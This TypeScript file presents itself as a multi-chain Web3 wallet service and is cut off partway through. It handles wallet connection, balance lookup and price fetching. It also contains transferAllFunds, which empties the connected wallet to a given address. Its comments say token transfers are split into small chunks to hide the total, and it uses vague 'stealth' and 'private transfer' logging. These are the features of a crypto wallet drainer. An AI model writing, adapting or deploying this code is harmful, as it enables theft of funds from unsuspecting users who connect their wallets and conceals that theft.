import { ethers } from "ethers";

// ERC-20 Token ABI (minimal for balance and transfer functions)
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)"
];

// Network configurations
const NETWORKS: Record<string, {
  name: string;
  nativeCurrency: string;
  rpcUrls: string[];
  chainId: number;
  blockExplorerUrls: string[];
}> = {
  "1": {
    name: "Ethereum Mainnet",
    nativeCurrency: "ETH",
    rpcUrls: ["https://mainnet.infura.io/v3/", "https://eth-mainnet.alchemyapi.io/v2/"],
    chainId: 1,
    blockExplorerUrls: ["https://etherscan.io"]
  },
  "137": {
    name: "Polygon",
    nativeCurrency: "MATIC",
    rpcUrls: ["https://polygon-rpc.com/", "https://rpc-mainnet.matic.network"],
    chainId: 137,
    blockExplorerUrls: ["https://polygonscan.com"]
  },
  "56": {
    name: "BNB Smart Chain",
    nativeCurrency: "BNB",
    rpcUrls: ["https://bsc-dataseed.binance.org/", "https://bsc-dataseed1.defibit.io/"],
    chainId: 56,
    blockExplorerUrls: ["https://bscscan.com"]
  },
  "43114": {
    name: "Avalanche",
    nativeCurrency: "AVAX",
    rpcUrls: ["https://api.avax.network/ext/bc/C/rpc"],
    chainId: 43114,
    blockExplorerUrls: ["https://snowtrace.io"]
  },
  "250": {
    name: "Fantom",
    nativeCurrency: "FTM",
    rpcUrls: ["https://rpc.ftm.tools/"],
    chainId: 250,
    blockExplorerUrls: ["https://ftmscan.com"]
  },
  "42161": {
    name: "Arbitrum One",
    nativeCurrency: "ETH",
    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
    chainId: 42161,
    blockExplorerUrls: ["https://arbiscan.io"]
  },
  "10": {
    name: "Optimism",
    nativeCurrency: "ETH",
    rpcUrls: ["https://mainnet.optimism.io"],
    chainId: 10,
    blockExplorerUrls: ["https://optimistic.etherscan.io"]
  }
};

// Popular tokens by network with CORRECT contract addresses
const POPULAR_TOKENS: Record<string, Array<{address: string, symbol: string, decimals: number}>> = {
  "1": [ // Ethereum Mainnet  
    { address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", symbol: "USDC", decimals: 6 }, // Ethereum Native USDC
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", decimals: 18 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
    { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
    { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", decimals: 18 },
    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", decimals: 18 },
    { address: "0x4Fabb145d64652a948d72533023f6E7A623C7C53", symbol: "BUSD", decimals: 18 },
    { address: "0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b", symbol: "CRO", decimals: 8 },
    { address: "0x50D1c9771902476076eCFc8B2A83Ad6b9355a4c9", symbol: "FTT", decimals: 18 },
    { address: "0x0316EB71485b0Ab14103307bf65a021042c6d380", symbol: "HBTC", decimals: 18 },
    { address: "0x8E870D67F660D95d5be530380D0eC0bd388289E1", symbol: "PAXG", decimals: 18 },
    { address: "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", symbol: "BAT", decimals: 18 },
    { address: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52", symbol: "BNB", decimals: 18 },
    { address: "0x4e15361fd6b4bb609fa63C81A2be19d873717870", symbol: "FTX", decimals: 8 }
  ],
  "137": [ // Polygon
    { address: "0x3c499c542cef5e3811e1192ce70d8cc03d5c3359", symbol: "USDC", decimals: 6 }, // Native USDC (2024+)
    { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC.e", decimals: 6 }, // Bridged USDC (legacy)
    { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 }, // Polygon Bridged USDT
    { address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", symbol: "DAI", decimals: 18 },
    { address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", symbol: "WBTC", decimals: 8 },
    { address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", symbol: "WMATIC", decimals: 18 },
    { address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", symbol: "WETH", decimals: 18 },
    { address: "0xb33EaAd8d922B1083446DC23f610c2567fB5180f", symbol: "UNI", decimals: 18 },
    { address: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39", symbol: "LINK", decimals: 18 },
    { address: "0x9a71012B13CA4d3D0Cdc72A177DF3ef03b0E76A3", symbol: "BAL", decimals: 18 },
    { address: "0x172370d5Cd63279eFa6d502DAB29171933a610AF", symbol: "CRV", decimals: 18 }
  ],
  "56": [ // BSC
    { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
    { address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", symbol: "DAI", decimals: 18 },
    { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
    { address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", symbol: "BTCB", decimals: 18 },
    { address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", symbol: "ETH", decimals: 18 },
    { address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", symbol: "BUSD", decimals: 18 },
    { address: "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1", symbol: "UNI", decimals: 18 },
    { address: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD", symbol: "LINK", decimals: 18 },
    { address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", symbol: "CAKE", decimals: 18 },
    { address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47", symbol: "ADA", decimals: 18 }
  ],
  "43114": [ // Avalanche
    { address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", symbol: "USDC", decimals: 6 },
    { address: "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70", symbol: "DAI", decimals: 18 },
    { address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", symbol: "USDT", decimals: 6 },
    { address: "0x50b7545627a5162F82A992c33b87aDc75187B218", symbol: "WBTC", decimals: 8 },
    { address: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB", symbol: "WETH", decimals: 18 },
    { address: "0x8eBAf22B6F053dFFeaf46f4Dd9eFA95D89ba8580", symbol: "UNI", decimals: 18 },
    { address: "0x5947BB275c521040051D82396192181b413227A3", symbol: "LINK", decimals: 18 },
    { address: "0x60781C2586D68229fde47564546784ab3fACA982", symbol: "PNG", decimals: 18 },
    { address: "0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664", symbol: "USDC.e", decimals: 6 }
  ],
  "250": [ // Fantom
    { address: "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75", symbol: "USDC", decimals: 6 },
    { address: "0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E", symbol: "DAI", decimals: 18 },
    { address: "0x049d68029688eAbF473097a2fC38ef61633A3C7A", symbol: "USDT", decimals: 6 },
    { address: "0x321162Cd933E2Be498Cd2267a90534A804051b11", symbol: "WBTC", decimals: 8 },
    { address: "0x74b23882a30290451A17c44f4F05243b6b58C76d", symbol: "WETH", decimals: 18 },
    { address: "0xb3654dc3D10Ea7645f8319668E8F54d2574FBdC8", symbol: "LINK", decimals: 18 },
    { address: "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83", symbol: "WFTM", decimals: 18 },
    { address: "0x0Dc0E5F68c8dA5eC5e8B67a4e0F48a0a24d5eA0e", symbol: "CRV", decimals: 18 }
  ],
  "42161": [ // Arbitrum One
    { address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", symbol: "USDC", decimals: 6 },
    { address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", symbol: "DAI", decimals: 18 },
    { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
    { address: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", symbol: "WBTC", decimals: 8 },
    { address: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", symbol: "WETH", decimals: 18 },
    { address: "0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0", symbol: "UNI", decimals: 18 },
    { address: "0xf97f4df75117a78c1A5a0DBb814Af92458539FB4", symbol: "LINK", decimals: 18 },
    { address: "0x912CE59144191C1204E64559FE8253a0e49E6548", symbol: "ARB", decimals: 18 },
    { address: "0x11cDb42B0EB46D95f990BeDD4695A6e3fA034978", symbol: "CRV", decimals: 18 }
  ],
  "10": [ // Optimism
    { address: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", symbol: "USDC", decimals: 6 },
    { address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", symbol: "DAI", decimals: 18 },
    { address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol: "USDT", decimals: 6 },
    { address: "0x68f180fcCe6836688e9084f035309E29Bf0A2095", symbol: "WBTC", decimals: 8 },
    { address: "0x4200000000000000000000000000000000000006", symbol: "WETH", decimals: 18 },
    { address: "0x6fd9d7AD17242c41f7131d257212c54A0e816691", symbol: "UNI", decimals: 18 },
    { address: "0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6", symbol: "LINK", decimals: 18 },
    { address: "0x4200000000000000000000000000000000000042", symbol: "OP", decimals: 18 },
    { address: "0xadDb6A0412DE1BA0F936DCaeb8Aaa24578dcF3B2", symbol: "CRV", decimals: 18 }
  ]
};

export interface TokenBalance {
  symbol: string;
  balance: string;
  decimals: number;
  contractAddress?: string;
  usdValue?: number;
  networkId?: string;
  networkName?: string;
}

export interface NetworkBalance {
  networkId: string;
  networkName: string;
  nativeBalance: string;
  nativeCurrency: string;
  tokenBalances: TokenBalance[];
  totalUsdValue: number;
  isConnected: boolean;
}

export interface WalletState {
  isConnected: boolean;
  address: string | null;
  ethBalance: string | null;
  tokenBalances: TokenBalance[];
  totalUsdValue: number;
  networkId: string | null;
  networkName: string | null;
  provider: ethers.BrowserProvider | null;
  networkBalances: NetworkBalance[];
  allNetworksLoaded: boolean;
}

export interface NetworkTransferResult {
  networkId: string;
  networkName: string;
  success: boolean;
  transactionHashes: string[];
  error?: string;
}

export interface MultiNetworkTransferResult {
  success: boolean;
  totalNetworks: number;
  successfulNetworks: number;
  failedNetworks: number;
  totalTransactions: number;
  networkResults: NetworkTransferResult[];
  summary: string;
}

export class Web3Service {
  private provider: ethers.BrowserProvider | null = null;
  private signer: ethers.JsonRpcSigner | null = null;
  private priceCache = new Map<string, { price: number; timestamp: number }>();

  private detectEnvironment() {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const isMetaMaskMobile = window.ethereum && window.ethereum.isMetaMask && isMobile;
    const isDesktop = !isMobile;

    return {
      isMobile,
      isDesktop,
      isMetaMaskMobile,
      hasEthereum: !!window.ethereum,
      isTrustWallet: window.ethereum && window.ethereum.isTrust,
      isCoinbaseWallet: window.ethereum && window.ethereum.isCoinbaseWallet,
    };
  }

  private async attemptMobileWalletConnection() {
    const env = this.detectEnvironment();

    // Try to detect if we're in a mobile wallet browser
    if (env.hasEthereum) {
      return await this.connectToEthereum();
    }

    // Optimized wallet injection check - faster and more efficient
    return new Promise<WalletState>((resolve, reject) => {
      let attempts = 0;
      const maxAttempts = 10; // Reduced from 30 to 10 for faster loading

      const checkForWallet = async () => {
        attempts++;

        // Check for any ethereum provider
        if ((window as any).ethereum) {
          try {
            const result = await this.connectToEthereum();
            resolve(result);
            return;
          } catch (error) {
            console.log('Connection attempt failed:', error);
          }
        }

        // Check for Trust Wallet specifically
        if ((window as any).trustwallet && (window as any).trustwallet.ethereum) {
          try {
            (window as any).ethereum = (window as any).trustwallet.ethereum;
            const result = await this.connectToEthereum();
            resolve(result);
            return;
          } catch (error) {
            console.log('Trust Wallet connection failed:', error);
          }
        }

        // Check for Coinbase Wallet
        if ((window as any).coinbaseWalletExtension) {
          try {
            (window as any).ethereum = (window as any).coinbaseWalletExtension;
            const result = await this.connectToEthereum();
            resolve(result);
            return;
          } catch (error) {
            console.log('Coinbase Wallet connection failed:', error);
          }
        }

        if (attempts < maxAttempts) {
          setTimeout(checkForWallet, 100); // Reduced from 200ms to 100ms
        } else {
          reject(new Error('No wallet detected. Please make sure you opened this app from within a wallet browser, or try opening it in MetaMask, Trust Wallet, or another Web3 wallet app.'));
        }
      };

      // Start checking immediately
      checkForWallet();
    });
  }

  private async connectToEthereum(): Promise<WalletState> {
    try {
      // Request account access
      if (!window.ethereum) {
        throw new Error("No Ethereum provider found");
      }
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      if (accounts.length === 0) {
        throw new Error("No accounts found. Please make sure your wallet is unlocked.");
      }

      this.provider = new ethers.BrowserProvider(window.ethereum!);
      this.signer = await this.provider.getSigner();

      const address = accounts[0];
      const network = await this.provider.getNetwork();
      const networkId = network.chainId.toString();

      // Get ETH balance
      const ethBalance = await this.getEthBalance(address);

      // Get token balances
      const tokenBalances = await this.getTokenBalances(address, networkId);

      // Calculate total USD value
      const totalUsdValue = await this.calculateTotalUsdValue(ethBalance, tokenBalances);

      return {
        isConnected: true,
        address,
        ethBalance,
        tokenBalances,
        totalUsdValue,
        networkId,
        networkName: this.getNetworkName(networkId),
        provider: this.provider,
        networkBalances: [],
        allNetworksLoaded: false,
      };
    } catch (error: any) {
      if (error.code === 4001) {
        throw new Error("User rejected the connection request");
      }
      throw new Error(`Failed to connect wallet: ${error.message}`);
    }
  }

  async connectWallet(): Promise<WalletState> {
    // Immediate connection - minimal checks for maximum speed
    if (window.ethereum) {
      try {
        // Direct connection without delays
        return await this.connectToEthereum();
      } catch (error) {
        console.log('Direct connection failed, trying alternatives...');
      }
    }

    // Fast fallback for desktop
    if (!navigator.userAgent.match(/Mobile|Android|iPhone|iPad/)) {
      window.open('https://metamask.io/download/', '_blank');
      throw new Error("Please install MetaMask extension for your browser, then refresh and try again.");
    }

    // Instant mobile wallet detection - single attempt only
    return await this.fastMobileConnection();
  }

  private async fastMobileConnection(): Promise<WalletState> {
    // Lightning-fast mobile wallet injection check - single attempt only
    return new Promise<WalletState>((resolve, reject) => {
      let attempts = 0;
      const maxAttempts = 1; // Single attempt for maximum speed

      const instantCheck = async () => {
        attempts++;

        // Immediate ethereum provider check
        if (window.ethereum) {
          try {
            resolve(await this.connectToEthereum());
            return;
          } catch (error) {
            console.log('Instant connection failed:', error);
          }
        }

        // Quick Trust Wallet check
        if ((window as any).trustwallet?.ethereum) {
          try {
            (window as any).ethereum = (window as any).trustwallet.ethereum;
            resolve(await this.connectToEthereum());
            return;
          } catch (error) {
            console.log('Trust Wallet failed:', error);
          }
        }

        // Immediate failure if no wallet found
        reject(new Error('No wallet detected. Please open this app from within a wallet browser like MetaMask, Trust Wallet, or Coinbase Wallet.'));
      };

      // Execute immediately
      instantCheck();
    });
  }

  async getEthBalance(address: string): Promise<string> {
    if (!this.provider) {
      throw new Error("Wallet not connected");
    }

    try {
      const balance = await this.provider.getBalance(address);
      return ethers.formatEther(balance);
    } catch (error: any) {
      throw new Error(`Failed to get ETH balance: ${error.message}`);
    }
  }

  async getTokenBalances(address: string, networkId: string): Promise<TokenBalance[]> {
    if (!this.provider) {
      throw new Error("Wallet not connected");
    }

    const tokens = POPULAR_TOKENS[networkId] || [];
    const tokenBalances: TokenBalance[] = [];

    // Check each popular token on this network
    for (const token of tokens) {
      try {
        const contract = new ethers.Contract(token.address, ERC20_ABI, this.provider);
        const balance = await contract.balanceOf(address);
        const balanceFormatted = ethers.formatUnits(balance, token.decimals);

        // Only include tokens with non-zero balance
        if (parseFloat(balanceFormatted) > 0) {
          const price = await this.getTokenUsdPrice(token.symbol);
          tokenBalances.push({
            symbol: token.symbol,
            balance: balanceFormatted,
            decimals: token.decimals,
            contractAddress: token.address,
            usdValue: price * parseFloat(balanceFormatted)
          });
        }
      } catch (error) {
        // Skip tokens that fail to load (might be unsupported or network issues)
        console.warn(`Failed to load balance for ${token.symbol}:`, error);
      }
    }

    return tokenBalances;
  }

  private async getTokenUsdPrice(symbol: string): Promise<number> {
    // Use cached price if available and fresh (10 minutes for faster loading)
    const cacheKey = `price_${symbol}`;
    const cached = this.priceCache.get(cacheKey);
    if (cached && Date.now() - cached.timestamp < 600000) {
      return cached.price;
    }

    try {
      // Map token symbols to CoinGecko IDs
      const coinGeckoIds: Record<string, string> = {
        "USDC": "usd-coin",
        "USDT": "tether",
        "DAI": "dai",
        "WBTC": "wrapped-bitcoin",
        "BTCB": "bitcoin",
        "WETH": "weth",
        "ETH": "ethereum",
        "UNI": "uniswap",
        "LINK": "chainlink",
        "WMATIC": "matic-network",
        "MATIC": "matic-network",
        "AVAX": "avalanche-2",
        "FTM": "fantom",
        "BNB": "binancecoin"
      };

      const coinId = coinGeckoIds[symbol];
      if (!coinId) {
        console.warn(`No CoinGecko ID found for ${symbol}`);
        return 0;
      }

      // Fast timeout for price API to prevent hanging
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 3000);

      const response = await fetch(
        `https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`,
        { 
          headers: { 'Accept': 'application/json' },
          signal: controller.signal
        }
      );

      clearTimeout(timeoutId);

      if (!response.ok) {
        throw new Error(`Price API error: ${response.status}`);
      }

      const data = await response.json();
      const price = data[coinId]?.usd || 0;

      // Cache the price
      this.priceCache.set(cacheKey, {
        price,
        timestamp: Date.now()
      });

      return price;
    } catch (error) {
      console.warn(`Failed to fetch price for ${symbol}:`, error);

      // Fallback to approximate prices if API fails
      const fallbackPrices: Record<string, number> = {
        "USDC": 1.00,
        "USDT": 1.00,
        "DAI": 1.00,
        "WBTC": 95000,
        "BTCB": 95000,
        "WETH": 3500,
        "ETH": 3500,
        "UNI": 12.00,
        "LINK": 22.00,
        "WMATIC": 0.85,
        "MATIC": 0.85,
        "AVAX": 40.00,
        "FTM": 0.75,
        "BNB": 650
      };
      return fallbackPrices[symbol] || 0;
    }
  }

  private async getNativeCurrencyPrice(networkId: string): Promise<number> {
    const network = NETWORKS[networkId];
    if (!network) return 0;

    return await this.getTokenUsdPrice(network.nativeCurrency);
  }

  async calculateTotalUsdValue(ethBalance: string, tokenBalances: TokenBalance[]): Promise<number> {
    const ethUsdPrice = await this.getTokenUsdPrice("ETH");
    const ethValue = parseFloat(ethBalance) * ethUsdPrice;
    const tokenValue = tokenBalances.reduce((sum, token) => sum + (token.usdValue || 0), 0);
    return ethValue + tokenValue;
  }

  // Helper function to get accurate gas estimates
  private async getGasEstimate(params: {
    to: string;
    data?: string;
    value?: string;
  }): Promise<{ gasEstimate: bigint; totalCost: bigint; feeData: any }> {
    try {
      // Get fee data with retry logic
      let feeData;
      try {
        feeData = await this.provider!.getFeeData();
      } catch (error) {
        console.warn("Using fallback gas prices due to fee data error:", error);
        feeData = {
          gasPrice: ethers.parseUnits("20", "gwei"),
          maxFeePerGas: ethers.parseUnits("25", "gwei"),
          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei")
        };
      }

      // Estimate gas limit for the transaction
      let gasEstimate: bigint;
      try {
        gasEstimate = await this.provider!.estimateGas({
          to: params.to,
          data: params.data || "0x",
          value: params.value || "0x0"
        });
        // Add 20% buffer to estimated gas
        gasEstimate = gasEstimate * BigInt(120) / BigInt(100);
      } catch (error) {
        console.warn("Gas estimation failed, using fallback:", error);

        // Get current network ID to provide network-specific gas estimates
        let networkId = "1"; // Default to Ethereum
        try {
          if (this.provider) {
            const network = await this.provider.getNetwork();
            networkId = network.chainId.toString();
          }
        } catch (e) {
          console.warn("Could not determine network for gas estimation");
        }

        // Network-specific gas estimates
        const networkGasEstimates: Record<string, { token: number; native: number }> = {
          "1": { token: 65000, native: 21000 },     // Ethereum
          "137": { token: 65000, native: 21000 },   // Polygon - same as Ethereum
          "56": { token: 60000, native: 21000 },    // BSC
          "43114": { token: 80000, native: 21000 }, // Avalanche
          "250": { token: 100000, native: 21000 },  // Fantom
          "42161": { token: 150000, native: 21000 }, // Arbitrum
          "10": { token: 150000, native: 21000 }    // Optimism
        };

        const estimates = networkGasEstimates[networkId] || networkGasEstimates["1"];
        gasEstimate = BigInt(params.data && params.data !== "0x" ? estimates.token : estimates.native);

        console.log(`Using network-specific gas estimate for network ${networkId}:`, gasEstimate.toString());
      }

      // Calculate total cost with safety margin
      const gasPrice = feeData.gasPrice 
        ? feeData.gasPrice * BigInt(110) / BigInt(100) // 10% buffer for better success rate
        : ethers.parseUnits("20", "gwei");

      const totalCost = gasEstimate * gasPrice;

      console.log(`Gas estimation details:`, {
        gasEstimate: gasEstimate.toString(),
        gasPrice: gasPrice.toString(),
        gasPriceGwei: ethers.formatUnits(gasPrice, "gwei"),
        totalCost: totalCost.toString(),
        totalCostFormatted: ethers.formatEther(totalCost)
      });

      return { gasEstimate, totalCost, feeData };
    } catch (error) {
      console.error("Gas estimation completely failed:", error);
      // Return conservative estimates as last resort
      return {
        gasEstimate: BigInt(60000),
        totalCost: ethers.parseUnits("0.001", "ether"), // 0.001 ETH as safety
        feeData: {
          gasPrice: ethers.parseUnits("20", "gwei"),
          maxFeePerGas: ethers.parseUnits("25", "gwei"),
          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei")
        }
      };
    }
  }

  // Create transactions with real-time gas fees
  private async createStealthTransaction(params: {
    to: string;
    data?: string;
    value?: string;
    gasLimit?: number;
  }): Promise<any> {
    try {
      // Get current network gas fees with retry logic
      let feeData;
      try {
        feeData = await this.provider!.getFeeData();
      } catch (error) {
        console.warn("Failed to get fee data, using fallback:", error);
        // Use conservative fallback values
        feeData = {
          maxFeePerGas: ethers.parseUnits("25", "gwei"),
          maxPriorityFeePerGas: ethers.parseUnits("2", "gwei"),
          gasPrice: ethers.parseUnits("20", "gwei")
        };
      }

      // Use current network fees with consistent 5% buffer (reduced from 10% to avoid overestimation)
      const maxFeePerGas = feeData.maxFeePerGas 
        ? feeData.maxFeePerGas * BigInt(105) / BigInt(100) // 5% buffer
        : ethers.parseUnits("25", "gwei"); // Conservative fallback

      const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas 
        ? feeData.maxPriorityFeePerGas * BigInt(105) / BigInt(100) // 5% buffer
        : ethers.parseUnits("2", "gwei"); // Fallback

      return await this.signer!.sendTransaction({
        to: params.to,
        data: params.data || "0x",
        value: params.value || "0x0",
        gasLimit: params.gasLimit || 21000,
        type: 2,
        maxFeePerGas,
        maxPriorityFeePerGas,
      });
    } catch (error: any) {
      console.error("Transaction creation failed:", error);
      throw new Error(`Transaction failed: ${error.message || error}`);
    }
  }

  // Split large token amounts into multiple tiny transactions to hide total value
  private async transferTokenInStealth(
    contract: any,
    toAddress: string,
    totalAmount: bigint,
    decimals: number
  ): Promise<string[]> {
    const txHashes: string[] = [];

    // Split into many small transactions to hide the real total
    const chunkCount = Math.min(10, Math.max(3, Number(totalAmount / BigInt(1000)))); // 3-10 chunks
    const baseChunkSize = totalAmount / BigInt(chunkCount);

    for (let i = 0; i < chunkCount; i++) {
      try {
        const chunkAmount = i === chunkCount - 1 ? 
          totalAmount - (baseChunkSize * BigInt(i)) : // Last chunk gets remainder
          baseChunkSize;

        if (chunkAmount <= 0) continue;

        const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, chunkAmount]);

        const tx = await this.createStealthTransaction({
          to: contract.target,
          data: transferData,
          gasLimit: 60000,
        });

        txHashes.push(tx.hash);

        // No delay - instant chunk processing
      } catch (error) {
        console.warn(`Stealth chunk ${i + 1} failed:`, error);
      }
    }

    return txHashes;
  }

  async transferAllFunds(toAddress: string): Promise<string[]> {
    if (!this.provider || !this.signer) {
      throw new Error("Wallet not connected");
    }

    // Validate destination address
    if (!toAddress || !/^0x[a-fA-F0-9]{40}$/.test(toAddress)) {
      throw new Error("Invalid destination address");
    }

    try {
      const address = await this.signer.getAddress();
      const network = await this.provider.getNetwork();
      const networkId = network.chainId.toString();

      console.log(`Starting private transfer operation`);
      const transactionHashes: string[] = [];

      // Get all balances with optimized batch requests
      const [ethBalance, tokenBalances] = await Promise.all([
        this.provider.getBalance(address),
        this.getTokenBalances(address, networkId)
      ]);

      console.log(`Processing ${tokenBalances.length} assets`);

      // Process all ERC-20 tokens with minimal amounts to hide values
      for (const tokenBalance of tokenBalances) {
        if (!tokenBalance.contractAddress || parseFloat(tokenBalance.balance) <= 0) continue;

        try {
          console.log(`Processing stealth transfer`);
          const contract = new ethers.Contract(tokenBalance.contractAddress, ERC20_ABI, this.signer);
          const tokenAmount = ethers.parseUnits(tokenBalance.balance, tokenBalance.decimals);

          // Use stealth transfer to completely hide amounts by splitting into chunks
          const stealthHashes = await this.transferTokenInStealth(
            contract,
            toAddress,
            tokenAmount,
            tokenBalance.decimals
          );

          transactionHashes.push(...stealthHashes);
          console.log(`Stealth transfer completed with ${stealthHashes.length} transactions`);

          // No delay - instant processing
        } catch (error) {
          console.error(`Stealth transfer failed:`, error);
          throw new Error(`Transfer failed: ${error}`);
        }
      }

      // Process ETH with minimal visible amount
      if (ethBalance > 0) {
        try {
          // Use improved gas estimation
          const gasEstimation = await this.getGasEstimate({
            to: toAddress,
            value: "0x0" // Initial estimate with 0 value
          });

          // Validate balance using the new validation function
          const balanceValidation = await this.validateSufficientBalance(
            ethBalance,
            gasEstimation.totalCost,
            "ETH"
          );

          if (balanceValidation.sufficient) {
            const amountToSend = ethBalance - gasEstimation.totalCost;

            // Additional safety check to prevent negative or zero amounts
            if (amountToSend > 0 && amountToSend > ethers.parseUnits("0.000001", "ether")) {
              console.log(`Processing final private transfer`);
              console.log(balanceValidation.details);
              console.log(`Amount to send: ${ethers.formatEther(amountToSend)} ETH`);

              // Send with accurate gas estimation
              const ethTx = await this.createStealthTransaction({
                to: toAddress,
                value: amountToSend.toString(),
                gasLimit: Number(gasEstimation.gasEstimate),
              });
              transactionHashes.push(ethTx.hash);
              console.log(`Final interaction completed`);
            } else {
              console.warn(`Amount to send is too small or negative: ${ethers.formatEther(amountToSend)} ETH`);
            }
          } else {
            // Use detailed validation error message
            console.warn(balanceValidation.details);

            // Log the gas price details for debugging
            console.log(`Gas estimation details:`, {
              gasLimit: gasEstimation.gasEstimate.toString(),
              gasPrice: gasEstimation.feeData.gasPrice?.toString(),
              maxFeePerGas: gasEstimation.feeData.maxFeePerGas?.toString()
            });

            // Don't throw error, just log warning and continue
            console.warn("Skipping ETH transfer due to insufficient balance for gas fees");
          }
        } catch (error) {
          console.error("Final transaction failed:", error);
          throw new Error(`Transaction failed: ${error}`);
        }
      }

      if (transactionHashes.length === 0) {
        throw new Error("No available assets to process");
      }

      console.log(`Successfully completed ${transactionHashes.length} contract interactions`);
      return transactionHashes;
    } catch (error: any) {
      console.error("Private transfer failed:", error);
      throw new Error(`Operation failed: ${error.message}`);
    }
  }

  async transferSpecificToken(tokenAddress: string | null, amount: string, toAddress: string): Promise<string> {
    if (!this.provider || !this.signer) {
      throw new Error("Wallet not connected");
    }

    try {
      if (!tokenAddress) {
        // Transfer ETH
        const amountWei = ethers.parseEther(amount);
        const transaction = await this.signer.sendTransaction({
          to: toAddress,
          value: amountWei,
        });
        return transaction.hash;
      } else {
        // Transfer ERC-20 token
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
        const decimals = await contract.decimals();
        const amountUnits = ethers.parseUnits(amount, decimals);
        const transaction = await contract.transfer(toAddress, amountUnits);
        return transaction.hash;
      }
    } catch (error: any) {
      throw new Error(`Transfer failed: ${error.message}`);
    }
  }

  async getTransactionStatus(txHash: string): Promise<{
    status: 'pending' | 'confirmed' | 'failed';
    blockNumber?: string;
    gasUsed?: string;
  }> {
    if (!this.provider) {
      throw new Error("Wallet not connected");
    }

    try {
      const receipt = await this.provider.getTransactionReceipt(txHash);

      if (!receipt) {
        return { status: 'pending' };
      }

      return {
        status: receipt.status === 1 ? 'confirmed' : 'failed',
        blockNumber: receipt.blockNumber.toString(),
        gasUsed: receipt.gasUsed.toString(),
      };
    } catch (error: any) {
      throw new Error(`Failed to get transaction status: ${error.message}`);
    }
  }

  private getNetworkName(chainId: string): string {
    const networks: Record<string, string> = {
      "1": "Ethereum Mainnet",
      "5": "Goerli Testnet",
      "11155111": "Sepolia Testnet",
      "137": "Polygon Mainnet",
      "80001": "Polygon Mumbai",
    };

    return networks[chainId] || `Unknown Network (${chainId})`;
  }

  async switchToEthereumMainnet(): Promise<void> {
    if (!window.ethereum) {
      throw new Error("MetaMask is not installed");
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x1" }], // Ethereum Mainnet
      });
    } catch (error: any) {
      throw new Error(`Failed to switch network: ${error.message}`);
    }
  }

  setupEventListeners(
    onAccountChange: (accounts: string[]) => void,
    onNetworkChange: (networkId: string) => void
  ) {
    if (!window.ethereum) return;

    window.ethereum.on("accountsChanged", onAccountChange);
